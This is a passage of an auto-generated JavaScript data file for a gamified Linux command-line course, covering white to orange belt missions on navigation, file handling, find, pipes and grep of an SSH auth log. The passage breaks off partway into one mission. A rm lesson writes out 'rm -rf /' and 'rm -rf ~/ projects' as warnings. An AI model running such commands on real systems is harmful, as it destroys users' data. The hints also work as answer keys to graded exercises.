// AUTO-GENERATED by tools/generate.py — do not edit by hand.
// Regenerate with:  python3 tools/generate.py
window.DOJO_MISSIONS = {
  "totalXp": 6500,
  "belts": [
    {
      "n": 1,
      "slug": "01-white-belt",
      "name": "White Belt",
      "color": "#f2f2ec",
      "rank": "Hatchling",
      "motto": "Every sensei once typed `ls` for the first time.",
      "notebook": "Draw the filesystem as a tree starting from `/`. Mark where your home (`~`) sits, and where `/etc`, `/var`, and `/tmp` live. In your own words, write the difference between an absolute path and a relative one.",
      "side": false,
      "missions": [
        {
          "id": "1.1",
          "slug": "01-hello-terminal",
          "title": "Hello, Terminal",
          "tagline": "Meet the shell — your new superpower.",
          "xp": 100,
          "minutes": 15,
          "boss": false,
          "path": "missions/01-white-belt/01-hello-terminal/README.md",
          "intro": "Welcome to the dojo, Hatchling. Before you can master Linux, you must speak to it directly. The terminal is not scary — it is honest. It does exactly what you say, which is why we will practice saying the right things.",
          "learn": [
            {
              "h": "What a shell actually is",
              "p": "When you open a terminal, a program called a **shell** (usually `bash` or `zsh`) starts and waits for you. You type a command, press Enter, the shell finds the program, runs it, shows the output, and waits again. That loop — read, run, repeat — is the whole game. Everything else in this dojo builds on it."
            },
            {
              "h": "Your first four commands",
              "code": "pwd        # Print Working Directory — where am I?\nwhoami     # which user am I logged in as?\ndate       # what time does the system think it is?\necho hi    # print back whatever I give you",
              "label": "Try each one now"
            },
            {
              "p": "`echo` looks silly until you realize it is how scripts talk, how you inspect variables, and how you write files without an editor. You will use it thousands of times."
            },
            {
              "h": "Redirection: sending output into a file",
              "p": "Normally output goes to your screen. The `>` operator redirects it into a file instead — creating the file if needed, **overwriting** it if it exists. Its sibling `>>` appends to the end instead of overwriting."
            },
            {
              "code": "echo \"words go here\" > note.txt    # create/overwrite note.txt\necho \"one more line\" >> note.txt   # append\ncat note.txt                        # show the file"
            },
            {
              "tip": "Press the ↑ arrow to recall previous commands, and press Tab to auto-complete file names. Sensei types half as much as you think."
            }
          ],
          "task": [
            {
              "step": "Open a terminal and `cd` into this mission folder (the folder containing this README)."
            },
            {
              "step": "Run `pwd`, `whoami` and `date` — just to feel the loop. Look at each output."
            },
            {
              "step": "Create a file `hello.txt` containing exactly the line `Hello, Tux!` using echo and `>`:",
              "code": "echo \"Hello, Tux!\" > hello.txt"
            },
            {
              "step": "Create `whoami.txt` containing the output of the `whoami` command (redirect it):",
              "code": "whoami > whoami.txt"
            },
            {
              "step": "Read both files back with `cat` to confirm what landed in them."
            }
          ],
          "artifacts": [
            [
              "hello.txt",
              "one line, exactly: Hello, Tux!"
            ],
            [
              "whoami.txt",
              "one non-empty line — your username"
            ]
          ],
          "hints": [
            "If `hello.txt` has the wrong text, just run the echo command again — `>` overwrites.",
            "Quotes matter: `echo \"Hello, Tux!\"` keeps the exclamation mark safe from the shell."
          ]
        },
        {
          "id": "1.2",
          "slug": "02-hidden-treasure",
          "title": "The Hidden Treasure",
          "tagline": "Navigate the filesystem. Find what hides from plain sight.",
          "xp": 100,
          "minutes": 20,
          "boss": false,
          "path": "missions/01-white-belt/02-hidden-treasure/README.md",
          "intro": "A maze of directories awaits inside this folder. Somewhere deep within lies a treasure — but it hides the way many important Linux files hide: behind a name that starts with a dot.",
          "learn": [
            {
              "h": "The filesystem is a tree",
              "p": "Linux organizes everything under a single root, `/`. Directories contain files and more directories. Your position in the tree is your *working directory* (`pwd` shows it). Paths starting with `/` are **absolute**; anything else is **relative** to where you stand."
            },
            {
              "h": "Moving around",
              "code": "cd maze            # go down into 'maze' (relative)\ncd corridor-a      # deeper\ncd ..              # up one level\ncd ../..           # up two levels\ncd -               # jump back to wherever you were before\ncd                 # no argument: go to your home directory"
            },
            {
              "h": "Looking around",
              "code": "ls          # list the current directory\nls -l       # long format: permissions, owner, size, date\nls -a       # ALL entries — including hidden dotfiles\nls -la      # both at once\nls -R       # recurse into subdirectories",
              "label": "The flags you will use forever"
            },
            {
              "p": "Files and directories whose names start with `.` are *hidden*: plain `ls` skips them. That is convention, not security — `.bashrc`, `.ssh`, `.gitignore` all live like this. `ls -a` reveals them (note the `.` and `..` entries: the directory itself and its parent)."
            },
            {
              "tip": "Tab completion works on directory names too. Type `cd cor` then Tab. If it beeps, press Tab twice to see the options."
            }
          ],
          "task": [
            {
              "step": "Explore `maze/` using `cd` and `ls -a`. Read the notes you find — the flavor is free, the practice is the point."
            },
            {
              "step": "Somewhere in the maze is a hidden file called `.treasure`. Find it."
            },
            {
              "step": "From this mission folder, copy the treasure's *content* into a file named `found.txt`:",
              "code": "cat maze/path/to/the/.treasure > found.txt   # fix the path to the real one"
            },
            {
              "step": "Create `answers.md` here with exactly these two lines (fill in the real values):",
              "code": "treasure_dir=NAME_OF_DIRECTORY_CONTAINING_TREASURE\nreveal_flag=THE_LS_FLAG_THAT_SHOWS_HIDDEN_FILES"
            }
          ],
          "artifacts": [
            [
              "found.txt",
              "the exact content of the hidden .treasure file"
            ],
            [
              "answers.md",
              "treasure_dir=… and reveal_flag=… filled in correctly"
            ]
          ],
          "hints": [
            "`ls -aR maze` sweeps the whole maze in one shot — corridors, shelves, everything.",
            "`treasure_dir` wants just the directory's name (like `cellar`), not the whole path.",
            "You can create answers.md with echo: `echo \"treasure_dir=...\" > answers.md` then `echo \"reveal_flag=...\" >> answers.md`."
          ]
        },
        {
          "id": "1.3",
          "slug": "03-the-architect",
          "title": "The Architect",
          "tagline": "Create structure out of nothing: mkdir and touch.",
          "xp": 100,
          "minutes": 15,
          "boss": false,
          "path": "missions/01-white-belt/03-the-architect/README.md",
          "intro": "Reading the tree is half the skill. Now you will grow branches yourself. An architect who needs seven commands for a five-room house is still a student; today you learn `-p` and brace expansion, the tools of lazy masters.",
          "learn": [
            {
              "h": "Creating directories",
              "code": "mkdir workshop                 # one directory\nmkdir -p a/b/c                 # create the WHOLE path, parents included\nmkdir -p proj/{src,docs,test}  # brace expansion: three dirs in one shot"
            },
            {
              "p": "Without `-p`, `mkdir a/b/c` fails if `a/b` does not exist. With `-p` it builds every missing level and never complains if something already exists. The braces `{src,docs}` are expanded by the *shell* before mkdir even runs — `echo proj/{src,docs}` shows you exactly what mkdir would receive. That trick works with every command, not just mkdir."
            },
            {
              "h": "Creating empty files",
              "code": "touch notes.txt                # create if missing (or update its timestamp)\ntouch a.txt b.txt c.txt        # several at once"
            },
            {
              "p": "`touch` exists to update file timestamps, but everyone uses it to create empty files. An empty file is often meaningful: lock files, `.gitkeep` markers, placeholders."
            },
            {
              "h": "A 60-second tour of the real tree",
              "list": [
                "`/etc` — system configuration (text files, mostly)",
                "`/home` — user home directories (`/home/tux`)",
                "`/var` — data that varies: logs (`/var/log`), queues, caches",
                "`/usr` — installed software and libraries",
                "`/tmp` — scratch space, wiped on reboot",
                "`/bin`, `/usr/bin` — the programs you have been running"
              ]
            },
            {
              "tip": "This layout is called the FHS (Filesystem Hierarchy Standard). When a config file goes missing, an expert *guesses* the right directory before searching. You will too."
            }
          ],
          "task": [
            {
              "step": "In this mission folder, build exactly this structure:",
              "code": "base-camp/\n├── bin/\n├── logs/\n│   └── archive/\n└── notes/\n    ├── ideas.txt\n    └── todo.txt"
            },
            {
              "step": "Inside `logs/archive/`, create a hidden marker file named `.keep` (empty).",
              "code": "touch base-camp/logs/archive/.keep"
            },
            {
              "step": "Challenge (honor system): build all the directories with ONE `mkdir -p` command using braces, and both txt files with ONE `touch`."
            },
            {
              "step": "Verify your work with `ls -laR base-camp`."
            }
          ],
          "artifacts": [
            [
              "base-camp/bin/, logs/archive/, notes/",
              "all directories exist"
            ],
            [
              "base-camp/notes/ideas.txt + todo.txt",
              "both files exist"
            ],
            [
              "base-camp/logs/archive/.keep",
              "hidden empty file exists"
            ]
          ],
          "hints": [
            "One-liner for the dirs: `mkdir -p base-camp/{bin,logs/archive,notes}`.",
            "One-liner for the files: `touch base-camp/notes/{ideas,todo}.txt`."
          ]
        },
        {
          "id": "1.4",
          "slug": "04-speed-reader",
          "title": "Speed Reader",
          "tagline": "cat, less, head, tail, wc — read files like a pro.",
          "xp": 100,
          "minutes": 20,
          "boss": false,
          "path": "missions/01-white-belt/04-speed-reader/README.md",
          "intro": "In Linux, *everything* wants to talk to you through text files: logs, configs, even the kernel. The expedition logbook in this folder is your training text. Learn to read big files without drowning in them.",
          "learn": [
            {
              "h": "Four readers, four jobs",
              "code": "cat logbook.txt        # dump the whole file (fine for small files)\nless logbook.txt       # PAGE through a big file (q to quit)\nhead -n 5 logbook.txt  # first 5 lines only\ntail -n 5 logbook.txt  # last 5 lines only"
            },
            {
              "h": "Survival keys inside less",
              "list": [
                "`Space` / `b` — next / previous page",
                "`/text` then Enter — search forward for “text”; `n` jumps to the next match",
                "`g` / `G` — jump to the beginning / end",
                "`q` — quit (the key everyone forgets first)"
              ]
            },
            {
              "h": "Counting with wc",
              "code": "wc -l logbook.txt   # lines\nwc -w logbook.txt   # words\nwc -c logbook.txt   # bytes"
            },
            {
              "p": "`tail` has a famous superpower you will meet again in ops work: `tail -f file` *follows* a file live, printing new lines as they are written. It is how people watch logs in real time. (Ctrl+C stops it.)"
            },
            {
              "tip": "Rule of thumb: `cat` for small files, `less` for everything else. Piping a giant file to your terminal with cat is a rite of passage — once."
            }
          ],
          "task": [
            {
              "step": "Save the first 5 lines of the logbook into `first5.txt`:",
              "code": "head -n 5 logbook.txt > first5.txt"
            },
            {
              "step": "Save the last 5 lines into `last5.txt`:",
              "code": "tail -n 5 logbook.txt > last5.txt"
            },
            {
              "step": "Open the logbook with `less`, search for the word `SIGNAL` (type `/SIGNAL` then Enter), and note the code that follows it. Quit with `q`."
            },
            {
              "step": "Count the lines of the logbook with `wc -l`, then create `answers.md`:",
              "code": "total_lines=NUMBER\nsignal=THE_CODE_YOU_FOUND"
            }
          ],
          "artifacts": [
            [
              "first5.txt",
              "exactly the first 5 lines of logbook.txt"
            ],
            [
              "last5.txt",
              "exactly the last 5 lines of logbook.txt"
            ],
            [
              "answers.md",
              "total_lines=… and signal=… filled in"
            ]
          ],
          "hints": [
            "The signal code looks like `word-word-number`. Copy it exactly.",
            "`wc -l logbook.txt` prints the count and the filename; the number is what you want."
          ]
        },
        {
          "id": "1.5",
          "slug": "05-boss-scavenger-hunt",
          "title": "BOSS — The Scavenger Hunt",
          "tagline": "Everything so far, in one hunt: navigate, reveal, read, count, write.",
          "xp": 250,
          "minutes": 25,
          "boss": true,
          "path": "missions/01-white-belt/05-boss-scavenger-hunt/README.md",
          "intro": "Your first trial, Hatchling. A village, a forest, and three shards hidden in the shadows. No new commands here — only proof that the old ones obey you. Defeat this and the white belt is yours.",
          "learn": [
            {
              "h": "Boss briefing",
              "p": "Inside `hunt/` are exactly **three hidden shard files** (`.shard-1`, `.shard-2`, `.shard-3`), each containing one word. Together, in order, they form a three-word passphrase. There is also a `wall-of-text.txt` whose line count guards the answer to one question."
            },
            {
              "h": "Your arsenal",
              "code": "ls -aR hunt          # sweep everything, hidden files included\ncat hunt/path/.shard-1\nwc -l hunt/wall-of-text.txt\nmkdir, echo >, >>      # you know these now"
            },
            {
              "tip": "When you need one file to contain several words on one line, remember that echo prints exactly what you give it: `echo \"a b c\" > file`."
            }
          ],
          "task": [
            {
              "step": "Find all three shards inside `hunt/` and read each one."
            },
            {
              "step": "Create a directory `trophy-room/` in this mission folder."
            },
            {
              "step": "Write the three shard words, in shard order, as ONE line separated by single spaces, into `trophy-room/passphrase.txt`. (Three words, one space between each.)"
            },
            {
              "step": "Count the lines of `hunt/wall-of-text.txt` and create `answers.md`:",
              "code": "lines=NUMBER\nshards_found=3"
            }
          ],
          "artifacts": [
            [
              "trophy-room/passphrase.txt",
              "the three shard words in order, one line"
            ],
            [
              "answers.md",
              "lines=… and shards_found=3"
            ]
          ],
          "hints": [
            "`ls -aR hunt` shows every hidden file at once — the shards' paths included.",
            "Shard order is the number in the file name, not the order you find them in.",
            "Passphrase format: `word1 word2 word3` — no commas, no extra spaces."
          ]
        }
      ]
    },
    {
      "n": 2,
      "slug": "02-yellow-belt",
      "name": "Yellow Belt",
      "color": "#f7d94c",
      "rank": "File Wrangler",
      "motto": "Move a thousand files with one line — or delete your weekend with one typo.",
      "notebook": "Write your personal rule for `rm`: the one thing you always do before deleting. Then sketch how a glob like `*.jpg` is expanded by the shell *before* the command ever runs.",
      "side": false,
      "missions": [
        {
          "id": "2.1",
          "slug": "01-copy-that",
          "title": "Copy That",
          "tagline": "cp and mv — duplicate, rename, relocate.",
          "xp": 100,
          "minutes": 15,
          "boss": false,
          "path": "missions/02-yellow-belt/01-copy-that/README.md",
          "intro": "A wrangler never edits originals. Today you learn the two commands that move matter around the filesystem — and the difference between them: `cp` makes more, `mv` makes elsewhere.",
          "learn": [
            {
              "h": "Copying",
              "code": "cp source.txt copy.txt          # copy a file\ncp source.txt some-dir/         # copy INTO a directory (same name)\ncp -r project/ project-backup/  # copy a whole directory tree (-r = recursive)"
            },
            {
              "p": "Directories need `-r` (recursive) — without it, cp refuses. A trailing `/` on the source vs not can matter in some tools; with plain `cp -r src dest`, if `dest` does not exist it becomes a copy of `src`, and if it exists, `src` lands *inside* it. When unsure, run `ls` after — verifying beats guessing."
            },
            {
              "h": "Moving and renaming are the same command",
              "code": "mv draft.txt final.txt        # rename in place\nmv final.txt archive/         # move into a directory\nmv old-name/ new-name/        # rename a directory (no -r needed!)"
            },
            {
              "p": "`mv` never copies data when staying on the same disk — it just relabels the entry, which is why moving a 10 GB folder is instant. That also means the old path is *gone* afterwards."
            },
            {
              "h": "The safety flags",
              "code": "cp -i src dst   # -i = ask before overwriting\nmv -i src dst   # same for mv\nmv -n src dst   # -n = never overwrite, silently skip"
            },
            {
              "tip": "Both `cp` and `mv` will happily crush an existing destination file without a word. Until reflexes form, `-i` is your seatbelt."
            }
          ],
          "task": [
            {
              "step": "Copy the whole `originals/` directory to a new directory `backup/`:",
              "code": "cp -r originals backup"
            },
            {
              "step": "Inside `backup/`, rename `contract.txt` to `contract-final.txt`."
            },
            {
              "step": "Create a directory `backup/assets/` and move `backup/logo.txt` into it."
            },
            {
              "step": "Confirm `originals/` still has all 3 untouched files — that is the whole point of working on a copy."
            }
          ],
          "artifacts": [
            [
              "backup/contract-final.txt",
              "same content as the original contract"
            ],
            [
              "backup/assets/logo.txt",
              "moved, not copied (no logo.txt left in backup/ root)"
            ],
            [
              "originals/",
              "completely untouched"
            ]
          ],
          "hints": [
            "Rename = `mv backup/contract.txt backup/contract-final.txt`.",
            "If you accidentally damaged `originals/`, restore it with `git checkout -- originals` from the repo — git is your time machine in this dojo."
          ]
        },
        {
          "id": "2.2",
          "slug": "02-demolition-crew",
          "title": "The Demolition Crew",
          "tagline": "rm — the command with no undo button.",
          "xp": 100,
          "minutes": 15,
          "boss": false,
          "path": "missions/02-yellow-belt/02-demolition-crew/README.md",
          "intro": "There is no recycle bin down here. `rm` unlinks files forever, instantly, silently. Which is exactly why the dojo makes you practice demolition in a controlled site before real life makes you practice it in production.",
          "learn": [
            {
              "h": "The demolition tools",
              "code": "rm file.txt              # delete a file\nrm a.txt b.txt c.txt     # several\nrm -r directory/         # delete a directory AND everything inside\nrmdir directory/         # delete a directory ONLY if it is empty (safe)\nrm -i file.txt           # ask first"
            },
            {
              "h": "Why everyone fears rm -rf",
              "p": "`-f` (force) silences errors and prompts; combined with `-r` and a bad path it can erase a system. The infamous `rm -rf /` needs privileges to hurt, but `rm -rf ~/ projects` (note the accidental space!) has destroyed real home directories: it means “delete my whole home, then delete projects”. Spaces and typos are the real enemy, not the command."
            },
            {
              "h": "The professional habit",
              "code": "ls site/junk/tmp*.txt     # 1) LOOK at what the pattern matches\nrm site/junk/tmp*.txt     # 2) only then delete the same pattern",
              "label": "Preview with ls, fire with rm"
            },
            {
              "tip": "In this dojo, everything is committed to git — `git status` shows what you deleted and `git checkout -- path` resurrects it. Real servers rarely offer that mercy; practice the ls-then-rm habit anyway."
            }
          ],
          "task": [
            {
              "step": "Inspect the demolition site first: `ls -R site`."
            },
            {
              "step": "Delete all the `tmp*.txt` files inside `site/junk/` (the directory itself stays)."
            },
            {
              "step": "Demolish the entire `site/rubble/` directory with one command."
            },
            {
              "step": "Do NOT touch `site/keep/gold.txt`. The auditor checks."
            }
          ],
          "artifacts": [
            [
              "site/junk/",
              "still exists, but no tmp files remain inside"
            ],
            [
              "site/rubble/",
              "gone entirely"
            ],
            [
              "site/keep/gold.txt",
              "intact"
            ]
          ],
          "hints": [
            "Preview first: `ls site/junk/tmp*.txt` — then reuse the exact same pattern with rm.",
            "A directory with files inside needs `rm -r site/rubble` — rmdir will refuse."
          ]
        },
        {
          "id": "2.3",
          "slug": "03-glob-master",
          "title": "Glob Master",
          "tagline": "Wildcards: make the shell do the boring work.",
          "xp": 100,
          "minutes": 20,
          "boss": false,
          "path": "missions/02-yellow-belt/03-glob-master/README.md",
          "intro": "Twenty-four files landed in your inbox. You could move them one by one like a tourist — or describe *patterns* and let the shell expand them. Globbing is the first time Linux starts feeling like a power tool.",
          "learn": [
            {
              "h": "The pattern language",
              "code": "*.jpg          # anything ending in .jpg\nphoto-*        # anything starting with photo-\n?.txt          # ONE single character, then .txt\nnotes-[abc].txt   # notes-a.txt, notes-b.txt or notes-c.txt\nreport-202[1-4].pdf   # character ranges work too"
            },
            {
              "h": "Who expands the pattern? (this is the key idea)",
              "p": "The **shell** expands globs *before* the command runs. When you type `mv *.jpg images/`, the program `mv` never sees the `*` — it receives the already-expanded list: `mv photo-01.jpg photo-02.jpg … images/`. That is why `echo *.jpg` is the perfect dry-run: it shows you literally what any command would receive."
            },
            {
              "p": "If a pattern matches nothing, bash passes it through as literal text (`*.xyz` stays `*.xyz`) — which usually ends in a confusing “file not found”. Another reason to `echo` first."
            },
            {
              "h": "Brace expansion — patterns you invent",
              "code": "mkdir sorted/{images,audio,docs,text,other}   # five dirs, one command\ncp file.txt{,.bak}                            # expands to: cp file.txt file.txt.bak"
            },
            {
              "tip": "Globs match *existing* names; braces generate *any* strings. They combine well, and both happen before the command ever runs."
            }
          ],
          "task": [
            {
              "step": "Create the destination tree in one command:",
              "code": "mkdir -p sorted/{images,audio,docs,text,other}"
            },
            {
              "step": "Using glob patterns (one `mv` per family), sort the inbox:",
              "code": "mv inbox/*.jpg sorted/images/\nmv inbox/*.mp3 sorted/audio/\nmv inbox/*.pdf sorted/docs/\nmv inbox/*.txt sorted/text/"
            },
            {
              "step": "Everything still left in `inbox/` (scripts, zips) goes to `sorted/other/` — one more mv with `*`."
            },
            {
              "step": "`ls inbox/` must come back empty. `ls -R sorted` shows your work."
            }
          ],
          "artifacts": [
            [
              "sorted/images/",
              "6 jpg files"
            ],
            [
              "sorted/audio/",
              "5 mp3 files"
            ],
            [
              "sorted/docs/",
              "4 pdf files"
            ],
            [
              "sorted/text/",
              "5 txt files"
            ],
            [
              "sorted/other/",
              "the remaining 4 files"
            ],
            [
              "inbox/",
              "empty"
            ]
          ],
          "hints": [
            "Preview any pattern with `echo inbox/*.jpg` before moving.",
            "The final sweep is just `mv inbox/* sorted/other/` — by then only non-matched files remain."
          ]
        },
        {
          "id": "2.4",
          "slug": "04-the-finder",
          "title": "The Finder",
          "tagline": "find — interrogate the whole tree with predicates.",
          "xp": 100,
          "minutes": 25,
          "boss": false,
          "path": "missions/02-yellow-belt/04-the-finder/README.md",
          "intro": "Globs reach one directory at a time. `find` walks the entire tree and answers questions: *what*, *where*, *how big*, *what type*. It is the bloodhound of Linux — point it somewhere and describe the scent.",
          "learn": [
            {
              "h": "Anatomy of a find command",
              "code": "find WHERE  TESTS...\nfind warehouse -name \"*.conf\"      # by name (quote the pattern!)\nfind warehouse -iname \"*DRAGON*\"   # case-insensitive name\nfind warehouse -type d              # only directories\nfind warehouse -type f -size +50k   # files bigger than 50 KB\nfind warehouse -empty               # empty files/dirs\nfind warehouse -maxdepth 1          # don't descend below one level"
            },
            {
              "p": "Quoting the pattern (`\"*.conf\"`) matters: unquoted, the *shell* might expand the glob against the current directory before find ever runs. Quoted, the pattern reaches find intact, and find applies it at every depth."
            },
            {
              "h": "Combining tests",
              "code": "find warehouse -type f -name \"*.conf\"        # AND (just list tests)\nfind warehouse -name \"*.log\" -o -name \"*.md\"  # OR\nfind warehouse ! -name \"*.txt\"                # NOT"
            },
            {
              "h": "Sizes",
              "list": [
                "`-size +50k` — bigger than 50 KB (`M` for MB, `G` for GB)",
                "`-size -10k` — smaller than 10 KB",
                "`+`/`-` mean over/under; no sign means “exactly” (rarely useful)"
              ]
            },
            {
              "p": "find also matches hidden files without asking — `-name \"*.conf\"` happily returns `.secret.conf`. The dot is only special to globs and plain ls, not to find."
            },
            {
              "tip": "Later (brown belt) you will bolt actions onto find with `-exec`. For now, redirecting its output into a file *is* the action."
            }
          ],
          "task": [
            {
              "step": "Save every `.conf` file's path (there are hidden ones — find sees them):",
              "code": "find warehouse -name \"*.conf\" > conf-files.txt"
            },
            {
              "step": "Save every path whose name contains `dragon`, any capitalization:",
              "code": "find warehouse -iname \"*dragon*\" > dragons.txt"
            },
            {
              "step": "Save every file bigger than 50 KB:",
              "code": "find warehouse -type f -size +50k > big-ones.txt"
            },
            {
              "step": "Find the one completely empty file in the warehouse (`-type f -empty`) and record it in `answers.md`:",
              "code": "empty_file=NAME_OF_THE_EMPTY_FILE"
            }
          ],
          "artifacts": [
            [
              "conf-files.txt",
              "4 paths (one is hidden)"
            ],
            [
              "dragons.txt",
              "3 paths"
            ],
            [
              "big-ones.txt",
              "exactly 1 path"
            ],
            [
              "answers.md",
              "empty_file=… (just the file name)"
            ]
          ],
          "hints": [
            "`wc -l conf-files.txt` tells you if you caught all 4.",
            "`empty_file` wants only the name, like `something.dat` — not the full path."
          ]
        },
        {
          "id": "2.5",
          "slug": "05-boss-great-cleanup",
          "title": "BOSS — The Great Cleanup",
          "tagline": "A real messy drive. Sort it, purge it, report it.",
          "xp": 250,
          "minutes": 35,
          "boss": true,
          "path": "missions/02-yellow-belt/05-boss-great-cleanup/README.md",
          "intro": "Someone's `chaos-drive/` has been accumulating digital sediment for years — vacation photos next to server configs next to `.tmp` crust. Yellow belts don't flinch at mess; they bring patterns. Sort everything, destroy the junk, file a report.",
          "learn": [
            {
              "h": "Boss briefing",
              "p": "Files hide at several depths inside `chaos-drive/`. Globs only reach one level (`chaos-drive/*/*.jpg` reaches two) — so either repeat patterns per level, or bring the bloodhound: `find` + `-exec`."
            },
            {
              "h": "find -exec: a preview of power",
              "code": "find chaos-drive -name \"*.jpg\" -exec mv {} sorted/images/ \\;",
              "label": "For each result, run mv — {} is the found path"
            },
            {
              "p": "`{}` is replaced by each found file; `\\;` terminates the command. This one-liner moves every jpg from any depth. Use it, or use per-level globs — the checker only judges the end state."
            },
            {
              "h": "Counting what you moved",
              "code": "find organized/images -type f | wc -l   # count files in a tree"
            },
            {
              "tip": "Do the junk deletion LAST — after the good files are already safe in `organized/`. Demolition after evacuation. That ordering habit saves careers."
            }
          ],
          "task": [
            {
              "step": "Create `organized/{documents,images,audio,configs,vault}` in this mission folder."
            },
            {
              "step": "From anywhere inside `chaos-drive/`, move: `*.pdf` → documents, `*.jpg` AND `*.png` → images, `*.mp3` → audio, `*.conf` → configs."
            },
            {
              "step": "Move the lost crypto wallet `old-wallet.dat` (somewhere in there) into `organized/vault/`."
            },
            {
              "step": "Delete every `*.tmp` file and every backup file ending in `~` anywhere inside `chaos-drive/`."
            },
            {
              "step": "Write `cleanup-report.md` with exactly these lines:",
              "code": "pdf_count=?\njpg_count=?\npng_count=?\nmp3_count=?\nconf_count=?\njunk_deleted=?"
            }
          ],
          "artifacts": [
            [
              "organized/documents|images|audio|configs",
              "all sorted by type, from every depth"
            ],
            [
              "organized/vault/old-wallet.dat",
              "the wallet, secured"
            ],
            [
              "chaos-drive/",
              "zero .tmp and zero ~ files remain"
            ],
            [
              "cleanup-report.md",
              "six counts, all correct"
            ]
          ],
          "hints": [
            "Count before you fill the report: `find organized/images -type f | wc -l`.",
            "Junk deletion: `find chaos-drive -name \"*.tmp\" -delete` and `find chaos-drive -name \"*~\" -delete` (or -exec rm {} \\;).",
            "junk_deleted = tmp files + ~ files, added together."
          ]
        }
      ]
    },
    {
      "n": 3,
      "slug": "03-orange-belt",
      "name": "Orange Belt",
      "color": "#f59e42",
      "rank": "Text Ninja",
      "motto": "Small tools, one pipe, infinite power.",
      "notebook": "Draw the three streams (stdin / stdout / stderr) of a command and how `|` connects one to the next. Then write the frequency-table idiom from memory: `sort | uniq -c | sort -nr`.",
      "side": false,
      "missions": [
        {
          "id": "3.1",
          "slug": "01-the-pipeline",
          "title": "The Pipeline",
          "tagline": "stdin, stdout, and the | that changed computing.",
          "xp": 100,
          "minutes": 25,
          "boss": false,
          "path": "missions/03-orange-belt/01-the-pipeline/README.md",
          "intro": "This is the single most important idea in Unix: every program reads from an input stream and writes to an output stream, and the `|` glues one program's output to the next program's input. Master this, and you stop using commands — you start composing them.",
          "learn": [
            {
              "h": "The three streams",
              "list": [
                "**stdin** (0) — what a program reads",
                "**stdout** (1) — its normal output (what `>` redirects)",
                "**stderr** (2) — its error channel, kept separate on purpose (`2>` redirects it)"
              ]
            },
            {
              "h": "The pipe",
              "code": "sort words.txt | uniq | wc -l\n#  └─ sorted lines ─┘   └ count them\n#            └─ duplicates collapsed",
              "label": "Output of one = input of the next"
            },
            {
              "p": "Each tool does ONE thing: `sort` orders lines, `uniq` collapses *adjacent* duplicates, `wc -l` counts. None of them knows the others exist. The pipeline is the program — that's the Unix philosophy in one line."
            },
            {
              "h": "Why uniq needs sort",
              "p": "`uniq` only removes duplicates that sit next to each other. Unsorted input leaves duplicates scattered and uncollapsed — the classic beginner surprise. `sort | uniq` is practically one word. Bonus: `sort -u` does both."
            },
            {
              "h": "The frequency-table idiom (memorize this one)",
              "code": "sort words.txt | uniq -c | sort -nr | head\n# uniq -c  → prefix each line with its count\n# sort -nr → numeric sort, reversed (biggest first)\n# head     → top 10",
              "label": "Top-N of anything"
            },
            {
              "tip": "You will use `sort | uniq -c | sort -nr` on IPs, error messages, file extensions, user agents… It is the swiss-army knife of quick analytics."
            }
          ],
          "task": [
            {
              "step": "Create `sorted.txt` — the words file, sorted:",
              "code": "sort words.txt > sorted.txt"
            },
            {
              "step": "Count how many DIFFERENT words exist and save the number into `unique-count.txt`:",
              "code": "sort words.txt | uniq | wc -l > unique-count.txt"
            },
            {
              "step": "Build the frequency table, look at the top, and write the most frequent word (just the word) into `top-word.txt`:",
              "code": "sort words.txt | uniq -c | sort -nr | head -n 3\necho \"THE_WINNER\" > top-word.txt"
            },
            {
              "step": "Create `answers.md` with how many times that winner appears:",
              "code": "most_common_count=NUMBER"
            }
          ],
          "artifacts": [
            [
              "sorted.txt",
              "words.txt in sorted order"
            ],
            [
              "unique-count.txt",
              "one number — distinct word count"
            ],
            [
              "top-word.txt",
              "the single most frequent word"
            ],
            [
              "answers.md",
              "most_common_count=…"
            ]
          ],
          "hints": [
            "The frequency table's first line is `COUNT WORD` — both of your answers live right there.",
            "23 different words hide in that file. If your unique count disagrees, check you sorted first."
          ]
        },
        {
          "id": "3.2",
          "slug": "02-grep-detective",
          "title": "Grep Detective",
          "tagline": "Find needles in log haystacks.",
          "xp": 100,
          "minutes": 25,
          "boss": false,
          "path": "missions/03-orange-belt/02-grep-detective/README.md",
          "intro": "Someone has been hammering this server's SSH door all afternoon. The evidence is in `auth.log`. `grep` is the tool every Linux professional reaches for first — today you make it a reflex.",
          "learn": [
            {
              "h": "grep fundamentals",
              "code": "grep \"Failed password\" auth.log     # lines containing the text\ngrep -i \"failed\" auth.log           # case-insensitive\ngrep -c \"Failed password\" auth.log  # just COUNT matching lines\ngrep -n \"root\" auth.log             # show line numbers\ngrep -v \"Accepted\" auth.log         # INVERT: lines NOT matching\ngrep -r \"pattern\" some-dir/         # search a whole directory tree"
            },
            {
              "h": "A taste of regular expressions",
              "code": "grep -E \"Failed|Accepted\" auth.log   # OR\ngrep \"^Mar\" auth.log                 # ^ anchors to line start\ngrep \"ssh2$\" auth.log                # $ anchors to line end\ngrep -E \"40[0-9]{3}\" auth.log        # digit classes and repetition",
              "label": "-E enables the richer 'extended' syntax"
            },
            {
              "p": "Always quote your pattern. Unquoted, the shell may mangle spaces, `$`, `*` before grep sees them. Quoting is not optional style — it is correctness."
            },
            {
              "h": "Detective workflow",
              "p": "Real log analysis is grep chained with the orange-belt tools you already know: `grep \"Failed\" auth.log | wc -l` counts, `grep ... | head` samples. Filter first, then count, then narrow again. Each pipe is one deductive step."
            },
            {
              "tip": "Beware of decoys: this log contains lines like `Invalid user admin from …` that are NOT `Failed password` lines. Detectives match precisely."
            }
          ],
          "task": [
            {
              "step": "Extract every failed login attempt:",
              "code": "grep \"Failed password\" auth.log > failed.txt"
            },
            {
              "step": "From those, extract the attempts against the `root` account:",
              "code": "grep \"Failed password for root\" auth.log > root-attempts.txt"
            },
            {
              "step": "Investigate: which IP appears most among failed attempts? (Eyeball it, or sneak-preview next mission: `grep \"Failed password\" auth.log | grep -oE \"[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+\" | sort | uniq -c | sort -nr`.)"
            },
            {
              "step": "File your findings in `answers.md`:",
              "code": "failed_count=NUMBER\nattacker_ip=THE_MOST_FREQUENT_FAILING_IP\naccepted_count=HOW_MANY_SUCCESSFUL_LOGINS"
            }
          ],
          "artifacts": [
            [
              "failed.txt",
              "all Failed password lines, nothing else"
            ],
            [
              "root-attempts.txt",
              "only the root-targeting subset"
            ],
            [
              "answers.md",
              "failed_count, attacker_ip, accepted_count"
            ]
          ],
          "hints": [
            "`grep -c` gives you failed_count and accepted_count without wc.",
            "The attacker tried the `admin` account from one IP a suspicious number of times."
          ]
        },
        {
          "id": "3.3",
          "slug": "03-cut-sort-count",
